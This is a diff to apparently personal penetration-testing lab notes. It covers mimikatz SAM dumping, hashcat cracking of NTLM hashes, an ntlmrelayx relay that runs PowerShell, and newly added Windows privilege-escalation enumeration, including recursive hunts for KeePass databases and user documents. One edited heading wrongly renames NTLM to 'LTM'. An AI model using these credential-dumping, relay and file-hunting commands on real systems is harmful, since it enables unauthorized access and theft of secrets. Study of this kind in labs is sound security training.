@@ -1211,7 +1211,7 @@ token::elevate
 
 lsadump::sam
 ```
-NLTM hash with hashcat
+LTM hash with hashcat
 ```
 hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
@@ -1284,3 +1284,112 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershe
 ```
 
 if UAC enabled we must run as Admin
+
+powershell get smb share
+
+```
+Get-ChildItem \\192.168.45.235\share
+```
+## Privilege Escalation
+
+### Windows
+
+Need to gather info
+
+```
+- Username and hostname
+- Group memberships of the current user
+- Existing users and groups
+- Operating system, version and architecture
+- Network information
+- Installed applications
+- Running processes
+```
+
+The hostname often can be used to infer the purpose and type of a machine. For example, if it is WEB01 for a web server or MSSQL01 for a MSSQL1 server.
+
+user/hostname
+```
+whoami
+whoami /groups
+```
+existing users and groups
+```
+powershell
+Get-LocalUser
+Get-LocalGroup
+```
+
+get the members of a group
+```
+Get-LocalGroupMember adminteam
+```
+
+get OS version
+```
+systeminfo
+```
+network info
+```
+ipconfig /all
+```
+
+routing
+```
+route print
+```
+
+active connections
+```
+netstat -ano
+```
+
+get 32 bit programs installed
+```
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+```
+
+64 bit programs
+```
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+```
+
+This list above only shows completed downloads. Should also check Downloads and Program Files
+
+
+Find running processes
+```
+Get-Process
+```
+
+Note that sometimes for listing installed apps, `select displayname` is not enough
+
+```
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+```
+
+Search for *.kdbx from root dir
+```
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
+
+can also include multiple files, .ini and .txt are common for xampp
+
+```
+Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+```
+
+search for all documents
+```
+Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+```
+
+info about a user
+```
+net user steve
+```
+
+Can use Runas if access to GUI.  If no access to GUI try RDP or Winrm
+```
+runas /user:backupadmin cmd
+```
